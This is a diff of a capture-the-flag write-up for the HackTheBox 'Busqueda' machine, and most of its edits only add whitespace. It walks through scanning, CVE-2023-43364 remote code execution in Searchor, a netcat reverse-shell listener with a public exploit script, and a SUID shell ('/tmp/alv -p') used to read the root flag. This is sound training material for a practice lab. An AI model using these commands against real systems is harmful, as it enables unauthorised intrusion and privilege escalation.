@@ -6,7 +6,9 @@ date: 2026-08-24
 Busqueda - HackTheBox
 
 OS: Linux
+
 Difficulty: Easy
+
 Pawn Date: 24/08/26
 
 ---
@@ -15,9 +17,12 @@ Recognition
  nmap 
 ```` nmap -p- -sVC IP ````
 
-Ports Found: 22,80
+Ports Found: 
+
+22,80
 
 Enumeration:
+
 They are only 2 open ports, Openssh and Apache. If you connect via http they will
 redirect you to ```` http://searcher.htb ````. So i decided to add this domain to my
 local DNS on ```` /etc/host ````
@@ -31,12 +36,14 @@ Searchor 2.4.0" so now i look on google to see if theres a CVE for that version 
 
 
 Initial Access:
+
 After i checked on google i found this CVE ```` CVE-2023-43364. ```` the vulnerability allows
 us RCE via the unsafe use of ```` eval() ```` that executes arbitrary Python code, so injecting
 code in the search query leads to RCE. So now we are going to install a tool on github that is
 gonna make all the hard work for us. 
 
-Exploit 
+Exploit:
+
 After i searched "CVE-2023-43364 Exploit" i found this github repo 'Herick-Costa
 CVE-2023-43364-Searchor-RCE-Exploit' and after learning hot to use it i set my nc listener as
 it says ```` nc -lvnp 4444 ```` i run the exploit ```` python3 CVE-2023-43364.py <URL> <LHOST> ````
@@ -47,6 +54,7 @@ and now we got a the shell, as always i upgrade the shell with
 
 
 Privilege Escalation:
+
 After getting the user flag, i checked the full user directory with ```` ls -la ```` and i saw this
 ``` drwxr-x--- 6 svc  svc  4096 Apr  8 21:09 
 drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..
@@ -216,6 +224,7 @@ After that we just need to execute it with the flag -p to preserve the root perm
 ```` /tmp/alv -p ```` and grab the flag ```` cat /root/root.txt ````
 
 Lessons Learned:
+
 - ALWAYS read the documentation
 - theres no a single way to pawn a box
 - I learned the basics of dockers
